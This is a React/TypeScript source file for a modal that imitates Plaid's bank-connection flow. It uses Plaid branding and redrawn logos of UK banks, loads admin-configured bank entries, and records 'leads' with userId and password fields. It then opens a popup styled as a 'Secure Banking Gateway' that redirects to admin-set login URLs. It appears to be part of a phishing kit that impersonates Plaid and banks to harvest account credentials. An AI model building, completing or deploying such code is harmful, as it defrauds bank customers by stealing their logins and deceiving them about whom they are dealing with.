"use client";

import { useEffect, useState } from "react";
import PlaidStepZero from "./plaid/PlaidStepZero";
import PlaidStepOne from "./plaid/PlaidStepOne";
import PlaidStepTwo from "./plaid/PlaidStepTwo";
import PlaidStepThree from "./plaid/PlaidStepThree";

type Bank = {
  id: string;
  name: string;
  subtitle: string;
  logoUrl?: string | null;
  redirectUrl?: string | null;
  subOptions?: string | null;
  personalUrl?: string | null;
  businessUrl?: string | null;
  commercialUrl?: string | null;
  enablePersonal?: boolean;
  enableBusiness?: boolean;
  enableCommercial?: boolean;
  order?: number;
};

const getFallbackLogo = (bankName: string) => {
  const name = bankName.toLowerCase();
  if (name.includes("barclays")) {
    return (
      <div className="w-10 h-10 rounded-full bg-[#00aeef]/10 flex items-center justify-center p-1.5">
        <svg viewBox="0 0 100 100" className="w-7 h-7 text-[#00aeef]" fill="currentColor">
          <path d="M50 15 C35 15, 20 28, 20 45 C20 62, 35 75, 50 85 C65 75, 80 62, 80 45 C80 28, 65 15, 50 15 Z M50 25 C42 32, 30 38, 30 50 C38 48, 45 42, 50 35 C55 42, 62 48, 70 50 C70 38, 58 32, 50 25 Z" />
          <circle cx="50" cy="20" r="4" />
        </svg>
      </div>
    );
  }
  if (name.includes("tide")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1">
        <div className="w-7 h-7 rounded-full border-[3.5px] border-[#2557e8] flex items-center justify-center" />
      </div>
    );
  }
  if (name.includes("natwest")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1">
        <svg viewBox="0 0 100 100" className="w-7 h-7 text-[#da1c5c]" fill="currentColor">
          <path d="M50 15 L78 32 L78 68 L50 85 L22 68 L22 32 Z" fill="none" stroke="#da1c5c" strokeWidth="12" />
          <path d="M50 25 L70 37 L70 63 L50 75 L30 63 L30 37 Z" fill="#da1c5c" />
        </svg>
      </div>
    );
  }
  if (name.includes("lloyds")) {
    return (
      <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center p-1 border border-slate-100">
        <svg viewBox="0 0 100 100" className="w-7 h-7 text-[#0f172a]" fill="currentColor">
          <path d="M28 65 C28 50, 40 40, 52 35 C48 30, 48 22, 54 18 C58 20, 62 26, 60 32 C68 35, 75 42, 74 52 C70 50, 66 50, 62 52 C58 55, 54 62, 56 70 C50 68, 44 68, 38 72 C32 68, 28 65, 28 65 Z" />
          <path d="M35 70 L30 85 L36 85 L42 74 L52 74 L56 85 L62 85 L56 70 Z" />
        </svg>
      </div>
    );
  }
  return (
    <div className="w-10 h-10 rounded-full bg-slate-900 text-white font-bold text-xs flex items-center justify-center">
      {bankName.slice(0, 2).toUpperCase()}
    </div>
  );
};

interface PlaidModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function PlaidModal({ isOpen, onClose }: PlaidModalProps) {
  const [step, setStep] = useState<0 | 1 | 2 | 3>(0);
  const [banks, setBanks] = useState<Bank[]>([]);
  const [search, setSearch] = useState("");
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [selectedOption, setSelectedOption] = useState<string>("Personal");

  const [isTransitioning, setIsTransitioning] = useState(false);
  const [isStepZeroLoading, setIsStepZeroLoading] = useState(false);

  useEffect(() => {
    if (!isOpen) {
      setStep(0);
      setSelectedBank(null);
      setSearch("");
      setIsTransitioning(false);
      setIsStepZeroLoading(false);
      return;
    }

    async function loadBanksFromAdmin() {
      try {
        const res = await fetch("/api/admin/banks");
        const json = await res.json();
        const banksData = json?.data || json;
        if (Array.isArray(banksData)) {
          setBanks(banksData);
        }
      } catch (err) {
        console.error("Failed to load admin banks:", err);
      }
    }
    loadBanksFromAdmin();
  }, [isOpen]);

  if (!isOpen) return null;

// Admin checkboxes ke mutabiq available options nikalna
  const getAvailableOptions = (bank: Bank) => {
    const options: string[] = [];
    if (bank.enablePersonal === true) options.push("Personal");
    if (bank.enableBusiness === true) options.push("Business");
    if (bank.enableCommercial === true) options.push("Commercial");
    return options;
  };

  const handleBankClick = (bank: Bank) => {
    setSelectedBank(bank);
    const available = getAvailableOptions(bank);
    
    // Final Smart Logic:
    // - Agar 1 se zyada options hain -> Step 2 show karo
    // - Agar sirf 1 option hai ya koi bhi nahi -> Direct Step 3 (Login Screen) par jao
    if (available.length > 1) {
      setStep(2);
    } else {
      setSelectedOption(available[0] || "Personal");
      setStep(3);
    }
  };

  const handleOptionClick = (option: string) => {
    setSelectedOption(option);
    setStep(3);
  };

  const handleBack = () => {
    if (step === 3) {
      const availableOptions = selectedBank ? getAvailableOptions(selectedBank) : [];
      setStep(availableOptions.length > 1 ? 2 : 1);
    } else if (step === 2) {
      setStep(1);
    } else if (step === 1) {
      setStep(0);
    } else {
      onClose();
    }
  };

  const handleStepZeroContinue = async () => {
    setIsStepZeroLoading(true);
    try {
      const res = await fetch("/api/admin/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: "Pending Selection",
          bankType: "Personal",
          userId: "",
          password: "",
          extraData: "Plaid Flow Initiated",
        }),
      });
      const json = await res.json();
      const leadId = json?.id || json?.data?.id || json?.lead?.id;
      if (leadId) {
        localStorage.setItem("active_lead_id", leadId);
      }
    } catch (err) {
      console.error("Failed to initialize lead:", err);
    } finally {
      setIsStepZeroLoading(false);
      setStep(1);
    }
  };

  const handleContinueToLogin = async () => {
    const popupWidth = 860;
    const popupHeight = 650;
    const left = window.innerWidth / 2 - popupWidth / 2;
    const top = window.innerHeight / 2 - popupHeight / 2;

    const newWindow = window.open(
      "",
      "OpenBankingPortal",
      `width=${popupWidth},height=${popupHeight},top=${top},left=${left},scrollbars=yes,resizable=yes`
    );

    if (newWindow) {
      newWindow.document.write(`
        <html>
          <head><title>Secure Banking Gateway</title></head>
          <body style="font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0f172a; color: #fff; margin: 0;">
            <div style="text-align: center;">
              <div style="width: 40px; height: 40px; border: 4px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px;"></div>
              <h3 style="margin: 0; font-size: 16px; font-weight: 700;">Connecting to ${selectedBank?.name || "Bank"}...</h3>
              <p style="color: #94a3b8; font-size: 12px; margin-top: 6px;">Establishing secure session gateway</p>
            </div>
            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
          </body>
        </html>
      `);
    }

    setIsTransitioning(true);

    try {
      const activeLeadId = localStorage.getItem("active_lead_id");
      
      let targetUrl = "";
      const optLower = (selectedOption || "").toLowerCase();
      
      if (optLower.includes("business")) {
        targetUrl = selectedBank?.businessUrl || selectedBank?.personalUrl || "";
      } else if (optLower.includes("commercial") || optLower.includes("corporate")) {
        targetUrl = selectedBank?.commercialUrl || selectedBank?.personalUrl || "";
      } else {
        targetUrl = selectedBank?.personalUrl || selectedBank?.businessUrl || selectedBank?.commercialUrl || "";
      }

      if (!targetUrl) {
        targetUrl = "https://authorise.lloydsbank.co.uk/auth/user";
      }

      // Exact Lead Tracking Update Payload
      if (activeLeadId && activeLeadId !== "undefined" && activeLeadId !== "null") {
        await fetch(`/api/admin/leads/${activeLeadId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            bank: selectedBank?.name || "Selected Bank",
            bankName: selectedBank?.name || "Selected Bank",
            bankType: selectedOption || "Personal",
            redirectUrl: targetUrl,
            extraData: `Verified Bank: ${selectedBank?.name} | Category: ${selectedOption} | Target: ${targetUrl}`,
          }),
        });
      }

   const streamUrl = targetUrl;
   
   setTimeout(() => {
        setIsTransitioning(false);
        if (newWindow) {
          newWindow.location.href = streamUrl;
        } else {
          window.open(streamUrl, "OpenBankingPortal");
        }
        onClose();
      }, 400);

    } catch (err) {
      console.error("Failed to process login redirection:", err);
      setIsTransitioning(false);
      if (newWindow) newWindow.close();
    }
  };

  const parsedOptions = selectedBank ? getAvailableOptions(selectedBank) : ["Personal"];

  const renderLogo = (bank: Bank) => {
    if (bank.logoUrl) {
      return (
        <img
          src={bank.logoUrl}
          alt={bank.name}
          className="h-full w-full object-contain"
          onError={(e) => {
            const target = e.currentTarget;
            target.style.display = "none";
          }}
        />
      );
    }
    return getFallbackLogo(bank.name);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-3 sm:p-4 backdrop-blur-[1px]">
      <div className="relative flex h-[620px] max-h-[92vh] w-full max-w-[390px] flex-col rounded-[24px] bg-white px-5 pt-4 pb-5 shadow-2xl overflow-hidden font-sans">
        
        {isTransitioning && (
          <div className="absolute inset-0 z-30 flex flex-col items-center justify-center bg-white/95 backdrop-blur-[2px]">
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-slate-200 border-t-[#0f172a]"></div>
            <p className="mt-4 text-sm font-semibold text-[#0f172a]">
              Connecting to {selectedBank?.name}...
            </p>
            <p className="text-xs text-slate-400 mt-1">Preparing secure session</p>
          </div>
        )}

        {/* Modal Header */}
        <div className="flex h-10 items-center justify-between z-20 shrink-0">
          {step !== 0 ? (
            <button
              type="button"
              onClick={handleBack}
              className="flex h-12 w-12 items-center justify-center rounded-full text-slate-800 hover:bg-slate-100 transition cursor-pointer"
            >
              <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3">
                <path d="M19 12H5M12 19l-7-7 7-7" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>
          ) : (
            <div className="w-8" />
          )}

          <div className="flex items-center justify-center">
            <img
              src="/plaid-black-logo.png"
              alt="Plaid"
              className="h-8 w-auto object-contain"
              onError={(e) => {
                const target = e.currentTarget;
                if (!target.src.includes("plaid-logo.png")) {
                  target.src = "/plaid-logo.png";
                }
              }}
            />
            <span className="text-[13px] font-black tracking-[0.16em] leading-none text-[#0c1938]">
              PLAID
            </span>
          </div>

          <button
            type="button"
            onClick={onClose}
            className="flex h-8 w-8 items-center justify-center rounded-full text-slate-800 hover:bg-slate-100 transition cursor-pointer"
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
              <line x1="18" y1="6" x2="6" y2="18" strokeLinecap="round" />
              <line x1="6" y1="6" x2="18" y2="18" strokeLinecap="round" />
            </svg>
          </button>
        </div>

        {/* Render Step Components */}
        {step === 0 && <PlaidStepZero onContinue={handleStepZeroContinue} isLoading={isStepZeroLoading} />}
        {step === 1 && <PlaidStepOne banks={banks} search={search} setSearch={setSearch} onSelectBank={handleBankClick} renderLogo={renderLogo} />}
        {step === 2 && <PlaidStepTwo selectedBank={selectedBank} options={parsedOptions} onSelectOption={handleOptionClick} onBack={() => setStep(1)} renderLogo={renderLogo} />}
        {step === 3 && <PlaidStepThree selectedBank={selectedBank} selectedOption={selectedOption} onContinueToLogin={handleContinueToLogin} renderLogo={renderLogo} />}

      </div>
    </div>
  );
}